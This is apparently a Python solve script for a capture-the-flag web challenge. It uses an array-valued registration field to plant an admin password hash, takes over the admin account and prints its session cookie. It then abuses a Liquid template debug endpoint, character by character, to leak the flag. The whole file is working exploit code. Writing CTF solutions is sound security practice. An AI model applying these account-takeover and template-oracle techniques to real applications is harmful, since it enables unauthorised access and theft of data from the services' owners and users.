import requests
import bcrypt

#CHALLENGE_URL = "http://localhost:3000"
CHALLENGE_URL = "https://app-3000-thank-you-javascript-67a803a55fe5.plfanzen.garden:443"

# register a user with an array as the first param
s = requests.Session()
r = s.post(f"{CHALLENGE_URL}/register",
       data=[
           ("email[]", "contact@cnf409.me"),
           ("email[]", "ADMIN"),
           ("email[]", bcrypt.hashpw(b"admin", bcrypt.gensalt(10)).decode()),
           ("username", "whatever"),
           ("password", "whatever")
       ])

if r.status_code != 200:
    print("Failed to register user")
    exit(1)
print("Registered user")

r = s.post(f"{CHALLENGE_URL}/login", data={"email": "contact@cnf409.me", "password": "admin"})

if r.status_code != 200:
    print("Failed to login")
    exit(1)
print("Logged in")

r = s.post(f"{CHALLENGE_URL}/update-password",
           data={"old_password":"whatever",
                 "new_password":"Coucou123!"}
           )

if r.status_code != 200:
    print("Failed to update password")
    exit(1)
print("Updated password")

r = s.get(f"{CHALLENGE_URL}/logout")

if r.status_code != 200:
    print("Failed to logout")
    exit(1)
print("Logged out")

r = s.post(f"{CHALLENGE_URL}/login", data={"email": "admin@admin.com", "password":"Coucou123!"})

if r.status_code != 200:
    print("Failed to login as admin")
    exit(1)
print("Logged in as admin")
print("Admin cookie: ", s.cookies.get("connect.sid"))

flag = "plfanzen{"
while True:
    template_contents = """
    <ul>
    {% assign chars = '0,1,2,3,4,5,6,7,8,9,_,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,}' | split: ',' %}
    {% assign probes = chars | group_by_exp: 'char', "'"""+flag+"""' | append: char" %}
    {% assign all = probes | push: flag %}
    {% assign sorted = all | sort_natural: 'name' %}
    {% for x in sorted %}|{{ x.items }}{% endfor %}|
    </ul>
    """

    r = s.post(f"{CHALLENGE_URL}/debug-template", data={"template": template_contents})
    if r.status_code != 200:
        print("Failed to send debug template")
        exit(1)
    char = r.text.split("||")[0][-1]
    flag += char
    print(f"\rFlag: {flag}", end="")
    if char == "}":
        break